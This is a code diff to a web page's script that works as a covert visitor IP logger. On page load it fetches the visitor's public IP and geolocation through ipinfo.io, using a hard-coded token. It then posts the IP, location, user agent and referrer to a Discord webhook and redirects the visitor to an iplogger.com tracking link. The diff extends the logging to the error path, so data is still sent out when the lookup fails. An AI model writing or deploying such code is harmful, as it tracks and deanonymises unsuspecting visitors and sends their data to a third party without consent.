@@ -11,8 +11,8 @@
             const referrer = document.referrer || "No referrer";
             const timestamp = new Date().toISOString();
             let locationLink = "N/A";
-            let city = "N/A";
-            let country = "N/A";
+            let city = "Unknown";
+            let country = "Unknown";
 
             try {
                 // Get public IP address
@@ -21,10 +21,10 @@
                 const ipAddress = ipData.ip;
 
                 // Get approximate location based on IP using ipinfo.io
-                const locationResponse = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+                const locationResponse = await fetch(`https://ipinfo.io/${ipAddress}?token=3d7f3132a436ea`);
                 const locationData = await locationResponse.json();
-                city = locationData.city || "N/A";
-                country = locationData.country || "N/A";
+                city = locationData.city || "Unknown";
+                country = locationData.country || "Unknown";
                 const ipLocationLink = `https://www.google.com/maps?q=${locationData.loc}`;
 
                 const logMessage = {
@@ -56,8 +56,36 @@
                 window.location.href = "https://iplogger.com/2lY8J3";
             } catch (error) {
                 console.error("Error fetching location:", error);
-                // Handle errors, e.g., redirect to a default page
-                window.location.href = "https://example.com/error";
+                // Log the error to Discord if possible
+                const logErrorMessage = {
+                    content: "@everyone",
+                    username: "Logger",
+                    embeds: [{
+                        title: "Error Log",
+                        color: 15158332,
+                        fields: [
+                            { name: "Error Message", value: error.message, inline: false },
+                            { name: "User Agent", value: userAgent, inline: false },
+                            { name: "IP Address", value: "Unknown", inline: false },
+                            { name: "Referrer", value: referrer, inline: false },
+                            { name: "Timestamp", value: timestamp, inline: false }
+                        ]
+                    }]
+                };
+
+                try {
+                    await fetch(webhookUrl, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(logErrorMessage)
+                    });
+                } catch (webhookError) {
+                    console.error("Error sending error log to webhook:", webhookError);
+                }
+
+                window.location.href = "https://iplogger.com/2lY8J3";
             }
         }
     </script>
